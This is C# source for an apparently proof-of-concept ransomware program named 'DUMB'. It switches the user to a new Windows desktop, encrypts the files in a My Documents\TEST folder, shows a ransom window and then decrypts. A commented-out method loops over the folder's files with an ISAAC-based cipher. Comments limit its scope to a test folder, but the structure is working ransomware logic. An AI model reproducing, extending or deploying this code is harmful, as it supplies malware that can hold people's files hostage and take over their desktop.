using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace DUMB
{
    static class Program
    {
        public static string folder = null;
        [STAThread]
        static void Main()
        {
            string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            folder = docs + @"\TEST\";

            if (!Directory.Exists(folder))
            {
                MessageBox.Show("Put a folder in My Documents called 'TEST' and chuck any files you want to get fucked up in there and next time read the god damn README", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            IntPtr hOldDesktop = WinAPI.GetThreadDesktop(WinAPI.GetCurrentThreadId());

            IntPtr hNewDesktop = WinAPI.CreateDesktop("DUMB",
            IntPtr.Zero, IntPtr.Zero, 0, (uint)WinAPI.DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);

            IntPtr hProc = IntPtr.Zero;
            try
            {
                WinAPI.SwitchDesktop(hNewDesktop);
                bool workdone = false;
                BackgroundWorker bg = new BackgroundWorker();
                bg.DoWork += delegate
                {
                    WinAPI.SetThreadDesktop(hNewDesktop);
                    try
                    {
                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        if(!File.Exists(folder + "crypted"))
                            Application.Run(new CryptWindow(false)); //Encrypt, you wouldn't actually do this in a ransomware, this is purely for the PoC
                        Application.Run(new Main()); //Ransom window
                        Application.Run(new CryptWindow(true)); //Decrypt
                    }
                    finally { workdone = true; }
                };
                bg.RunWorkerAsync();

                while (!workdone)
                    System.Threading.Thread.Sleep(100);
            }
            catch { }
            finally
            {
                WinAPI.SwitchDesktop(hOldDesktop);
                WinAPI.CloseDesktop(hNewDesktop);
            }
        }

        static void HackTheGibson(bool decrypt = false)
        {
            //Grab the location for MyDocs (+ \TEST\ because this is a PoC), iterate files and crypt them
            /*string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            string folder = docs + @"\TEST\";

            if (!Directory.Exists(folder))
            {
                MessageBox.Show("Put a folder in My Documents called 'TEST' and chuck any files you want to get fucked up in there and next time read the god damn README", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!decrypt && File.Exists(folder + "crypted")) return true; //There's no way to know if the files are actually crypted or not, so we'll use a file

            //Generate the key
            ISAAC csprng = PassTheKeysBro();

            string[] files = Directory.GetFiles(folder); //I'm not actually sure if foreach would execute this on each enumeration, I'll assume it does
            foreach (string file in files)
            {
                if (Path.GetFileName(file) == "crypted") continue;
                CryptFile(csprng, file);
            }

            if (!decrypt) File.Create(folder + "crypted").Close();
            else if (File.Exists(folder + "crypted")) File.Delete(folder + "crypted");

            for (int i = 0; i < ISAAC.SIZE; i++)
                csprng.mem[i] = 0; //Zero out ISAAC so it's not in the memory

            return true;*/
        }
    }
}
